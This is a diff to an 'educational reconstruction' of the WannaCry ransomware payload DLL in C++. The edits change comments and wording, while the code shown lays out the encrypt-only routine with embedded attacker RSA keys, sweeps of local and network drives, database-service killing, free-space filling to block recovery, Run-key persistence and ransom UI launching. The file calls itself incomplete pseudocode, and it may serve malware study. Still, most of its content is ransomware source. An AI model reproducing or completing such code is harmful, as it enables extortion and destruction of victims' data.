@@ -1,9 +1,9 @@
-// ============================================================================
-// wcry_payload_dll.cpp — WannaCry ransomware core (t.wnry payload DLL), educational reconstruction.
-// Role: on launch it loads the c.wnry config, builds the RSA/AES key set, then walks every drive —
-//   staging files to .WNCYR and encrypting them to .WNCRY — while installing persistence.
-// Education note: ENCRYPT-ONLY by design — this DLL cannot decrypt anything; the payment UI (u.wnry / @WanaDecryptor@.exe) does that.
-// ============================================================================
+// wcry_payload_dll.cpp — the WannaCry payload core (t.wnry payload DLL)
+// Loads the c.wnry config, builds the RSA/AES key set, then walks every
+// drive staging files to .WNCYR and encrypting them to .WNCRY while
+// installing persistence. ENCRYPT-ONLY by design: the payment/decrypt UI
+// (u.wnry / @WanaDecryptor@.exe) does all decrypting.
+// Reconstructed from the 2017 WannaCry binary (educational).
 
 #include <windows.h>
 // File and crypto APIs are resolved dynamically at startup — see Globals below.
@@ -80,7 +80,7 @@ int ReadConfig(int doRead)
 // Process helpers
 // ---------------------------------------------------------------------------
 // Spawns a child process, optionally waits up to timeoutMs (killing it on
-// timeout) and reports its exit code. Used for the decryptor UI, registry
+// timeout) and reports its exit code. Used for the payment/decrypt UI, registry
 // commands, the taskkill sweep and the self-delete batch.
 int RunProcess(LPSTR cmdline, DWORD timeoutMs, LPDWORD exitCode)
 {
@@ -226,11 +226,13 @@ static BOOL RsaCtxAcquire(RsaCtx *c)
 
 // Key setup. The binary ships two hardcoded 2048-bit RSA public-key blobs
 // (the attacker's keys) inside the DLL itself:
-//   * First run, no .pky yet (pubFile == NULL): import embedded blob #1 into
+//   * First run, no .pky yet (pubFile == NULL): import the first embedded
+//     blob into
 //     the ENCRYPT slot. Files are then wrapped to the attacker's built-in
 //     public key — the malware always carries a usable key.
 //   * Otherwise: import the public key from the .pky file. If that import
-//     fails, import embedded blob #2 into the DECRYPT slot, generate a fresh
+//     fails, import the second embedded blob into the DECRYPT slot, generate
+//     a fresh
 //     RSA-2048 pair, export its public half to the .pky and its encrypted
 //     private half to the .eky, then re-import the .pky. (.eky is the
 //     victim's own key-escrow file, paid for at "purchase" time.)
@@ -287,7 +289,7 @@ static int TestKeyPair(RsaCtx *c, const char *pubFile, const char *privFile)
 // key alongside %08X.pky) and, via TestKeyPair, whether they form a working
 // pair. Only returns true once a usable decryption key exists on disk —
 // i.e. after payment, when the attacker's decryptor has dropped the private
-// key. The whole encryptor shuts up and stops encrypting once this opens.
+// key. The whole payload core stops encrypting once this opens.
 static int TryRestoreDecryptionKey(DWORD id)
 {
     char dky[52]; sprintf(dky, "%08X.dky", id);
@@ -394,7 +396,7 @@ static void AesCryptModes(AesCtx *c, BYTE *in, BYTE *out, DWORD len, int mode)
 //   +0x118  AES-128-CBC ciphertext, NULL IV
 //
 // BOTH passes are ENCRYPT. There is no decrypt branch in this DLL — victims'
-// files are only ever decrypted by the separate payment-UI program.
+// files are only ever decrypted by the separate payment/decrypt UI.
 // ---------------------------------------------------------------------------
 int CryptorProcessFile(RsaCtx *c, LPCWSTR origPath, LPCWSTR newPath, UINT mode)
 {
@@ -616,7 +618,7 @@ int CryptorMultiPassEncryptDir(RsaCtx *c, LPCWSTR dir, int)
 // PersistRunKeyThread — autorun persistence: writes a Run key (HKCU; HKLM
 //   when admin) whose value NAME is a fresh random tag and whose data
 //   re-launches the payload. 10 s command timeout.
-// InstallDecryptorShortcuts — drops a copy of the decryptor UI (u.wnry)
+// InstallDecryptorShortcuts — drops a copy of the payment/decrypt UI (u.wnry)
 //   plus a small VBS launcher and a self-deleting .bat, giving the victim a
 //   desktop path to the payment screen.
 // WriteRansomNote — drops @Please_Read_Me@.txt from the r.wnry template; the
@@ -639,12 +641,12 @@ int CryptorMultiPassEncryptDir(RsaCtx *c, LPCWSTR dir, int)
 //     on user data (Exchange, SQL Server, MySQL);
 //   * sweep all local drives Z:→C:, then all network drives Z:→C:;
 //   * re-enumerate the user's profile folders;
-//   * on the first cycle, run the decryptor UI's connectivity check and,
+//   * on the first cycle, run the payment/decrypt UI's connectivity check and,
 //     afterwards, fill free space on every fixed drive (blocks recovery);
 //   * persist app state and sleep 60 s, then loop.
 // On first entry it also seeds the free-decrypt parameters (10 files,
-// 1-in-100 odds), records the install time and runs the decryptor once
-// with the "fi" argument.
+// 1-in-100 odds), records the install time and runs the payment/decrypt UI
+// once with the "fi" argument.
 void MainEncryptLoop(RsaCtx *c)
 {
     char cmdline[0x400];                                    // RunProcess argv
@@ -683,10 +685,10 @@ void MainEncryptLoop(RsaCtx *c)
         InterlockedExchange(&g_lastDriveSerial, -1);
         EnumUserDirs(0x19 /* profile-folder id */);
         bool firstCheck = (g_lastCheck == 0);
-        if (firstCheck) { sprintf(cmdline, "%s co", "@WanaDecryptor@.exe"); RunProcess(cmdline, 0, NULL); }  // decryptor UI connection check
+        if (firstCheck) { sprintf(cmdline, "%s co", "@WanaDecryptor@.exe"); RunProcess(cmdline, 0, NULL); }  // payment/decrypt UI connection check
         time(&g_lastCheck); SaveAppState();
         if (pass + 1 == 1)
-            sprintf(cmdline, "cmd.exe /c start /b %s vs", "@WanaDecryptor@.exe");   // pop the decryptor UI detached
+            sprintf(cmdline, "cmd.exe /c start /b %s vs", "@WanaDecryptor@.exe");   // pop the payment/decrypt UI detached
             RunProcess(cmdline, 0, NULL);
         if (firstCheck) {
             FillDiskFreeSpace(2);
@@ -706,7 +708,7 @@ extern "C" __declspec(dllexport)
 int TaskStart(HMODULE hinst, int reason)
 {
     if (reason != 0) {
-        // relaunch entry: just run the persistence / decryptor-relaunch
+        // relaunch entry: just run the persistence / UI-relaunch
         // thread (30 s loop — see appendix) and wait on it forever
         HANDLE t = CreateThread(NULL, 0, PersistTaskscheThread,
                                 NULL, 0, NULL);
@@ -771,7 +773,7 @@ out:
 // ============================================================================
 // Educational reconstruction: annotated pseudocode with deliberate elisions;
 // not compilable as-is. This DLL only ever encrypts — decryption of victims'
-// files lives in the separate payment-UI program.
+// files lives in the separate payment/decrypt UI.
 // ============================================================================
 
 // ============================================================================
@@ -784,7 +786,7 @@ out:
 //   - read the clock; if the persisted timestamps are not sane yet, just sleep
 //   - first run: stamp the current time into the c.wnry config so later
 //     runs know they are not the first
-//   - relaunch the decryptor UI so the ransom screen stays in front of the
+//   - relaunch the payment/decrypt UI so the ransom screen stays in front of the
 //     victim on every cycle
 //   - first run: resolve the full path of tasksche.exe and register it as
 //     an autorun via "cmd.exe /c reg add ...Run..." (random value name,
